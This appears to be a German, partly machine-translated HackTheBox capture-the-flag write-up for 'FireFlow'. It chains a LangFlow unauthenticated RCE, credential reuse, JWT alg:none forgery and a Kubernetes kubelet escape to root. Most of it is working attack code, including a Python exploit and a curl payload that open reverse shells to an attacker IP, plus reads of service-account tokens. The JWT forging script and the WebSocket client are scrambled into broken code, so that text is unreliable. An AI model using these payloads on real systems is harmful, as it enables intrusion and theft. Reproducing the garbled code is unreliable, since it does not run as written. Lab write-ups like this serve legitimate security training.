#  Hack-the-Box-FireFlow 

 HTB Writeup — FireFlow (Mittel, Linux) · LangFlow RCE → JWT-Bypass → K8s-Escape 

 --- 

 ##  Übersicht 

 **  Schwierigkeitsgrad:  **  Mittel 
 **  Betriebssystem:  **  Linux 
 **  Kategorie:  **  Web-/Cloud-/Container-Escape 
 **  Plattform:  **  HackTheBox 

 FireFlow ist eine mehrstufige Maschine, die eine nicht authentifizierte RCE in einer LangFlow-Instanz, eine geleakte Anmeldeinformationsdatei, eine JWT  -`alg:none`  -Fälschung gegen einen MCP-Server und einen Kubernetes-Escape über ein übermäßig privilegiertes Dienstkonto verkettet. 

 --- 

 ##  Exploit-Kette 

Aufklärung (nmap) → LangFlow unauth RCE → www-data shell
→ .env-Credential-Leak → SSH als Nightfall → Benutzer-Flag
→ MCP-Konfiguration → JWT-Algorithmus:none-Fälschung → MCP-Tool-RCE → mcp-Pod-Shell
→ K8s RBAC (Knoten/Proxy) → Kubelet WebSocket exec
→ privilegierter Hostpfad-Pod → Root-Flag
Text


--- 

 ## Schritt 1 — Erkundung 

 ### 1.1 Eintrag in die Hosts-Datei 

 ```bash 
 echo "10.129.153.242 fireflow.htb flow.fireflow.htb" | sudo tee -a /etc/hosts 

1.2 Nmap-Scan
bash

mkdir   -p  ~/fireflow  &&   cd  ~/fireflow 
 nmap -p- --min-rate  5000   -T4   -oN  nmap_all.txt fireflow.htb 

Offene Ports:
Hafen 	Service 	Version
22/tcp 	SSH 	OpenSSH 9.6p1 Ubuntu
443/tcp 	HTTPS 	nginx (Zertifikat *.fireflow.htb)
1.3 Subdomain-Erkennung
bash

curl   -sk  https://fireflow.htb/  |   grep   -oE   'playground/[0-9a-f-]+' 
 # → playground/<FLOW_ID> 

Die Landingpage verlinkt zu einer öffentlichen LangFlow-Spielwiese auf flow.fireflow.htbDie
Schritt 2 – LangFlow: Nicht authentifizierte Remote-Code-Ausführung
2.1 Schwachstelle

Der Endpunkt POST /api/v1/build_public_tmp/{flow_id}/flowist ohne Authentifizierung erreichbar und akzeptiert eine vollständige Ablaufdefinition über die optionale dataParameter. Der codeDas Feld einer beliebigen Knotenvorlage wird ausgeführt über exec() ohne Sandboxing .

Zwei Fallstricke:

    Die Nutzdaten müssen auf Modulebene (nicht innerhalb einer Methode) liegen – der Loader ruft sie auf prepare_global_scope(), wodurch der gesamte Modulkörper ausgewertet wird.

    Das äußere JSON muss Folgendes enthalten: data.nodesArray und ein inputs: null Feld. 

2.2 Exploit-Skript
Python

import  requests  ,  uuid  ,  urllib3 
 urllib3  .  disable_warnings  (  ) 

 TARGET  =   "https://flow.fireflow.htb" 
 FLOW_ID  =   "<FLOW_ID>" 
 LHOST  =   "<VPN_IP>" 
 LPORT  =   4444 

 shell_cmd  =   "bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'"   %   (  LHOST  ,  LPORT  ) 

 code_value  =   ( 
     "import os\n\n" 
     "_x = os.system(\"%s\")\n\n" 
     "from lfx.custom.custom_component.component import Component\n" 
     "from lfx.io import Output\n" 
     "from lfx.schema.data import Data\n\n" 
     "class ExploitComp(Component):\n" 
     " display_name=\"X\"\n" 
     " outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n" 
     " def r(self)->Data:\n" 
     " return Data(data={})" 
 )   %  shell_cmd 

 data  =   { 
     "data"  :   { 
         "nodes"  :   [  { 
             "id"  :   "Exploit-001"  , 
             "type"  :   "genericNode"  , 
             "position"  :   {  "x"  :   0  ,   "y"  :   0  }  , 
             "data"  :   { 
                 "id"  :   "Exploit-001"  , 
                 "type"  :   "ExploitComp"  , 
                 "node"  :   { 
                     "template"  :   { 
                         "code"  :   { 
                             "type"  :   "code"  ,   "required"  :   True  ,   "show"  :   True  , 
                             "multiline"  :   True  ,   "value"  :  code_value  , 
                             "name"  :   "code"  ,   "password"  :   False  , 
                             "advanced"  :   False  ,   "dynamic"  :   False 
                         }  , 
                         "_type"  :   "Komponente" 
                     }  , 
                     "Beschreibung"  :   "X"  , 
                     "Basisklassen"  :   [  "Daten"  ]  , 
                     "Anzeigename"  :   "ExploitComp"  , 
                     "Name" :   "ExploitComp"  , 
                     "frozen"  :   False  , 
                     "outputs"  :   [  { 
                         "types"  :   [  "Data"  ]  ,   "selected"  :   "Data"  , 
                         "name"  :   "o"  ,   "display_name"  :   "O"  , 
                         "method"  :   "r"  ,   "value"  :   "__UNDEFINED__"  , 
                         "cache"  :   True  ,   "allows_loop"  :   False  , 
                         "tool_mode"  :   False  ,   "hidden"  :   None  , 
                         "required_inputs"  :   None  ,   "group_outputs"  :   False 
                     }  ]  , 
                     "field_order"  :   [  "code"  ]  , 
                     "beta"  :   False  ,   "edited"  :   False 
                 } 
             } 
         }  ]  , 
         "edges"  :   [  ] 
     }  , 
     "inputs"  :   None 
 } 

 url  =  TARGET  +   "/api/v1/build_public_tmp/"   +  FLOW_ID  +   "/flow" 
 try  : 
 r  =  requests  .  post  (  url  ,  json  =  data  , 
 cookies  =  {  "client_id"  :   str  (  uuid  .  uuid4  (  )  )  }  , 
 verify  =  False  ,  timeout  =  30  ) 
     print  (  "Status:"  ,  r  .  status_code  ) 
 except  requests  .  exceptions  .  ReadTimeout  : 
     print  (  "[+] Shell aktiv"  ) 

2.3 Ausführung
bash

# Terminal A 
 rlwrap  nc   -lvnp   4444 

 # Terminal B 
 python3 exploit.py 

Ergebnis: Shell als www-data@fireflowDie
Schritt 3 – Datenleck → SSH als Nachtfall
bash

cat  /etc/langflow/.env 

Relevante Werte:
Das

LANGFLOW_SUPERUSER  =  langflow 
 LANGFLOW_SUPERUSER_PASSWORD  =  <PASSWORD> 
 LANGFLOW_SECRET_KEY  =  <SECRET> 

Das gleiche Passwort funktioniert auch für den Systembenutzer. nightfall:
bash

ssh  nightfall@fireflow.htb 

bash

cat  ~/user.txt 
 # → Benutzerflag 

Schritt 4 – MCP-Serveraufzählung
bash

cat  ~/.mcp/config.json 

JSON

{ 
   "server"  :   "http://fireflow.htb:30080"  , 
   "status_endpoint"  :   "/api/v1/version"  , 
   "user"  :   "langflow-bot"  , 
   "password"  :   "<MCP_PASSWORD>" 
 } 

Endpoint discovery:
bash

curl   -s  http://fireflow.htb:30080/openapi.json  |  python3  -c   " 
 import json,sys 
 d=json.load(sys.stdin) 
 for p,m in d['paths'].items(): 
 for meth in m: print(meth.upper(), p) 
 " 

Text

GET /api/v1/version 
 POST /api/v1/auth 
 GET /api/v1/tools 
 POST /api/v1/tools [admin] 
 POST /mcp [MCP JSON-RPC 2.0] 

Schritt 5 — JWT-Algorithmus: keiner Fälschung
5.1 Ein gültiges Token beschaffen
bash

curl   -s   -X  POST http://fireflow.htb:30080/api/v1/auth  \ 
   -H   "Content-Type: application/json"   \ 
   -d   '{"username":"langflow-bot","password":"<MCP_PASSWORD>"}' 

Die dekodierte Nutzlast enthält "role":"user"Die
5.2 Schwachstelle

Der Server akzeptiert ausdrücklich alg:noneund überspringt die Unterschriftenprüfung:
Python

if  alg  ==   "none"  : 
 payload  =  jose_jwt  .  decode  (  token  ,  key  =  ""  ,  options  =  {  "verify_signature"  :   False  }  ) 

→ Jedes unsignierte JWT wird als vertrauenswürdig eingestuft. Die Rolle kann einfach auf „Vertrauen“ gesetzt werden. adminDie
5.3 Schmiede den Token
Python

import  base64  ,  json 

 def   b64url  (  data  )  : 
     return  base64.urlsafe_b64encode  :  .rstrip  (  data  )  decode  (  )  b'='  .  .  (  )  header 

 =  b64url  (  json.dumps  (  attacker  :  {  "  alg"  :   "none"  ,   "typ"  "   JWT"  }  )  "  encode  (  )  ) 
 payload  =  b64url  (  json.dumps  {  }  (  {  "sub"  "   "  ,   "role"  :   admin"  )  .  encode  (  )  )  print 
 (  f  "  {  header  }  .  .  payload  }  "  ) 

bash

FAKE  =  $(  python3 fake_jwt.py  ) 

Schritt 6 – RCE über die MCP-Tool-Registry
6.1 Registrieren eines Reverse-Shell-Tools
bash

curl   -s   -X  POST http://fireflow.htb:30080/api/v1/tools  \ 
   -H   "Authorization: Bearer  $FAKE  "   \ 
   -H   "Content-Type: application/json"   \ 
   -d   '{"name":"rev","description":"x","code":"import socket,subprocess,os;s=socket.socket();s.connect((\"<VPN_IP>\",5555));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])"}' 

6.2 Auslösen
bash

curl   -s   -X  POST http://fireflow.htb:30080/mcp  \ 
   -H   "Authorization: Bearer  $FAKE  "   \ 
   -H   "Content-Type: application/json"   \ 
   -d   '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"rev","arguments":{}}}' 

Ergebnis: Shell als mcpinnerhalb eines Kubernetes-Pods.
Schritt 7 – Kubernetes-Enumeration
7.1 Dienstkonto-Token
bash

TOKEN  =  $(  cat  /var/run/secrets/kubernetes.io/serviceaccount/token  ) 
 NS  =  $(  cat  /var/run/secrets/kubernetes.io/serviceaccount/namespace  ) 

7.2 Berechtigungen prüfen
bash

curl   -sk   -X  POST https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews  \ 
   -H   "Authorization: Bearer  $TOKEN  "   \ 
   -H   "Content-Type: application/json"   \ 
   -d   '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' 

Kritische Berechtigung gefunden:
JSON

{   "verbs"  :   [  "get"  ]  ,   "apiGroups"  :   [  ""  ]  ,   "resources"  :   [  "nodes/proxy"  ]   } 

7.3 Pods über den Kubelet-Proxy auflisten
bash

NODE  =  fireflow 
 curl   -sk   -H   "Authorization: Bearer  $TOKEN  "   \ 
   "https://10.43.0.1:443/api/v1/nodes/  $NODE  /proxy/pods" 

Ziel gefunden: monitoring/prometheus-prometheus-node-exporter-nmntq, mit hostPathHalterungen für /proc, /sys, Und /Die
Schritt 8 – Kubelet WebSocket Exec → Root
8.1 Konzept

RBAC gewährt nur get An nodes/proxy (NEIN create An pods/exec auf Port 10250 validiert jedoch Der Kubelet lediglich das Service-Account-Token – er erzwingt keine RBAC. Daher können wir uns über WebSocket direkt mit dem privilegierten Pod verbinden.
8.2 Minimaler Python-WebSocket-Client
Python

import  socket  ,  ssl  ,  base64  ,  os  ,  sys  ,  struct 

 HOST  =  "fireflow"  ;  PORT  =  10250 
 NAMESPACE  =  "monitoring" 
 >  1  else 
 "  query  = 

 "  output  =  1  "  &  "  error   =   1  &  in  id  +  POD = "prometheus-prometheus-node-exporter-nmntq" CONT = "node-exporter" cmd = sys.argv[1] if len(sys.argv)   "   &   "   .join 
 (  "   command   =   "  w  +  var  for   w  cmd.split  (  ' /  )  )  /run/secrets/ kubernetes.io  exec  path  =  f 
 "  /   /  {  NAMESPACE  }  /  {  POD  }  /  {  CONT  }  ?  {  query  }  " 

 TOKEN  =   open  (  /serviceaccount/token'  )  .  read  (  )  .  strip  (  ) 
 key  =  base64.b64encode  (  os.urandom  "  f  (  16  decode  )  )  .  path  req  (  ) 

 =  {   (  f"GET  HTTP  }  }  /1.1\r\nHost:  {  HOST  }  :  {  PORT  }  \r\nUpgrade: websocket\r\n" 
        Connection: Upgrade\r\nSec-WebSocket-Key:  {  key  \  r\n" 
        \nSec-WebSocket-Protocol: v4.channel.k8s.io\r\n" 
        f"Authorization: Bearer  {  TOKEN  }  \r\n  ) 

 ctx  =  ssl.create_default_context  f"Sec-WebSocket-Version: 13\ r  ctx.check_hostname  (  )  ;  r  \  n  =  False  ;  ctx.verify_mode  \  ssl  =  .  "  CERT_NONE 
 s  =  ctx.wrap_socket  in  socket.create_connection  (  not  b  buf  (  (  HOST  ,  PORT  )  ,  timeout  =  15  )  ,  server_hostname  =  HOST  ) 
 s.sendall  :  (  n  req.encode  \  (  )  )  buf.partition 

 buf  =  "" 
 while   r\n\r\n"   buf   +  =  s.recv  (  4096  )  _  ,  (  b  _ 
 ,  rest  =  r  "  b  "  "  \  \  \r\n  ) 
 leftover =  rest 

 while   True  : 
     try  : 
 data  =  leftover  if  leftover  else   b"" 
         while   len  (  data  )   <   2  : 
 c  =  s  .  recv  (  4096  ) 
             if   not  c  :  sys  .  exit  (  0  ) 
 data  +=  c 
 b1  ,  b2  =  data  [  0  ]  ,  data  [  1  ]  ;  op  =  b1  &  0x0f  ;  ln  =  b2  &  0x7f  ;  off  =  2 
         if  ln  ==  126  : 
             while   len  (  data  )  <  4  :  data  +=  s  .  recv  (  4096  ) 
 ln  =  struct  .  unpack  (  ">H"  ,  data  [  2  :  4  ]  )  [  0  ]  ;  off  =  4 
         elif  ln  ==  127  : 
             while   len  (  data  )  <  10  :  data  +=  s  .  recv  (  4096  ) 
 ln  =  struct.unpack  [  "  (  Q  ,  data  off  2:10  :  0  ]  )  [  ]  (  ;  off  =  10 
         while   len  ]  data  )  <  +  ln  :  >  data  =  s.recv  (  4096  [  data  ) 
 payload  =  ,  [  off  off  +  ln  ]  ]  ;  leftover  =  data  [  off  +  ln  :  : 
         if  op  ==  0x8  :   break 
         if  op  in   (  0x1  (  0x2  )   and  payload  : 
 sys.stdout.write  )  )  .  decode  (  payload  1  \  )  :  "  (  =  errors  ]  replace  "  )  ;  sys.stdout.flush  n  )  ERR  (  e  " 
     except  Exception  as  e  ( 
         print  ,  "  ;  [  break  s.close  ​ 

​ ​ ​  "  + 

8.3 Überprüfen
bash

python3 x.py  "id" 
 # uid=0(root) gid=65534(nobody) 

8.4 Lesen Sie die Root-Flagge
bash

python3 x.py  "cat /proc/1/root/root/root.txt" 
 # → Root-Flag 

Der Trick: hostPath: /wird in den node-exporter-Container eingebunden, und /proc/1/root/erreicht das Host-Dateisystem.
Ergebnis
Flagge 	Status
Benutzer 	erhalten
Root	obtained
Core Concepts
Concept	Application in FireFlow
LangFlow unauth RCE	build_public_tmp runs custom component code unsandboxed
Module-level payload	Payload must run at module scope, not inside a method
Credential hygiene	Plaintext .env used by the application process
JWT alg:none	Server whitelists none → unsigned forgery accepted
MCP tool registry	Tool code runs when invoked via /mcp JSON-RPC
K8s RBAC review	SelfSubjectRulesReview reveals nodes/proxy
Kubelet auth model	Port 10250 validates the token but ignores RBAC
WebSocket-Subprotokoll 	v4.channel.k8s.iofür Ausführungsströme
Containerflucht 	hostPath: /+ /proc/1/root/= Host-Dateisystem
Prinzip der geringsten Privilegien 	Unter der SA-Schlange nodes/proxy— sollte entfernt werden
Werkzeuge & Referenzen

    Nmap

    LangFlow 1.8.2

    Python 3 ( requests, jose(serverseitig)

    jq

    rlwrap

    screen

    Kubernetes SelfSubjectRulesReview: https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/self-subject-rules-review-v1/

    Kubelet server reference: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go

Disclaimer

This writeup documents an authorized penetration test on the HackTheBox platform only. All credentials and flags are part of the training environment and are not production data.

⭐ If this writeup helps you, feel free to leave a star.
text


